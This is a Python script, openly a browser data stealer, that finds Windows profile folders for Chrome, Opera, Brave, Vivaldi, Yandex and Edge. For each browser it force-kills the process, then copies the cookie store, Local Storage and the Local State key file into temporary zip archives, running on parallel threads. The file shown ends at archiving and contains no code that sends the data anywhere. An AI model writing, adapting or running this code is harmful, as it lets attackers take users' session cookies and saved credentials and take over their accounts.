import shutil, os, random, getpass, tempfile, time, threading

username = getpass.getuser()

paths = [    
    [f"C:/Users/{username}/AppData/Roaming/Opera Software/Opera GX Stable",               "opera.exe",        "/Local Storage/leveldb",           "/",             "/Network",             "/Local Extension Settings/"                      ],
    [f"C:/Users/{username}/AppData/Roaming/Opera Software/Opera Stable",                  "opera.exe",        "/Local Storage/leveldb",           "/",             "/Network",             "/Local Extension Settings/"                      ],
    [f"C:/Users/{username}/AppData/Roaming/Opera Software/Opera Neon",  "opera.exe",        "/Local Storage/leveldb",           "/",             "/Network",             "/Local Extension Settings/"                      ],
    [f"C:/Users/{username}/AppData/Local/Google/Chrome",                        "chrome.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/Default/Local Extension Settings/"              ],
    [f"C:/Users/{username}/AppData/Local/Google/Chrome SxS",                    "chrome.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/Default/Local Extension Settings/"              ],
    [f"C:/Users/{username}/AppData/Local/Google/Chrome Beta",                   "chrome.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/Default/Local Extension Settings/"              ],
    [f"C:/Users/{username}/AppData/Local/Google/Chrome Dev",                    "chrome.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/Default/Local Extension Settings/"              ],
    [f"C:/Users/{username}/AppData/Local/Google/Chrome Unstable",               "chrome.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/Default/Local Extension Settings/"              ],
    [f"C:/Users/{username}/AppData/Local/Google/Chrome Canary",                 "chrome.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/Default/Local Extension Settings/"              ],
    [f"C:/Users/{username}/AppData/Local/BraveSoftware/Brave-Browser",          "brave.exe",        "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/Default/Local Extension Settings/"              ],
    [f"C:/Users/{username}/AppData/Local/Vivaldi",                              "vivaldi.exe",      "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/Default/Local Extension Settings/"              ],
    [f"C:/Users/{username}/AppData/Local/Yandex/YandexBrowser",                 "yandex.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/HougaBouga/"                                    ],
    [f"C:/Users/{username}/AppData/Local/Yandex/YandexBrowserCanary",           "yandex.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/HougaBouga/"                                    ],
    [f"C:/Users/{username}/AppData/Local/Yandex/YandexBrowserDeveloper",        "yandex.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/HougaBouga/"                                    ],
    [f"C:/Users/{username}/AppData/Local/Yandex/YandexBrowserBeta",             "yandex.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/HougaBouga/"                                    ],
    [f"C:/Users/{username}/AppData/Local/Yandex/YandexBrowserTech",             "yandex.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/HougaBouga/"                                    ],
    [f"C:/Users/{username}/AppData/Local/Yandex/YandexBrowserSxS",              "yandex.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/HougaBouga/"                                    ],
    [f"C:/Users/{username}/AppData/Local/Microsoft/Edge",                       "msedge.exe",         "/Default/Local Storage/leveldb",   "/Default",      "/Default/Network",     "/Default/Local Extension Settings/"              ]
]

love = [
    '/User Data/Default/Network',
    '/User Data/Default/Local Storage',
    '/User Data/Local State'
]

def StealBrowser(path, exename):

    os.system(f'taskkill /f /im {exename}')

    time.sleep(3)

    temp_dir = tempfile.gettempdir()+'/'+str(random.randint(100000,999999))
    os.makedirs(temp_dir)

    path2 = tempfile.gettempdir()+'/'+exename+str(random.randint(100000,999999))

    for foldername, subfolders, filenames in os.walk(path):
        for filename in filenames:
            file_path = (foldername+'/'+filename).replace('\\', '/')

            withoutpath = file_path.removeprefix(path)

            for el in love:

                if withoutpath.startswith(el):

                    #print(withoutpath)
                    
                    last = ''

                    for bb in withoutpath.split('/')[:-1]:
                        #print(bb)
                        last+=f'/{bb}'

                        if not os.path.exists(f'{temp_dir}{last}'): 
                            try:os.makedirs(f'{temp_dir}{last}')
                            except Exception as e:print(e)
                    
                    shutil.copyfile(path+withoutpath, temp_dir+withoutpath)

    shutil.make_archive(path2, 'zip', temp_dir)

                    #with open(f'{temp_dir}{withoutpath}', 'wb') as f:
                        
                    #    with open(path+withoutpath, 'rb') as f2: f.write(f2.read())
                    
    return path2

for path in paths:

    if os.path.exists(path[0]):

        threading.Thread(target=StealBrowser, args=(path[0], path[1],)).start()